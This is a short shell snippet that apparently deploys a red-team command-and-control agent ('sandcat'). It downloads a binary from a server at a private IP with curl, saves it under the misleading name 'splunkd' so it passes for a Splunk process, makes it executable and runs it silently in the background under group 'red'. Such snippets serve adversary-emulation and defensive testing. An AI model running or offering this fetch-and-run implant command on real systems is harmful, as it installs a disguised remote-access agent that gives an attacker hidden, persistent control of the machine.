server="http://192.168.56.1:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red 1>/dev/null 2>/dev/null &
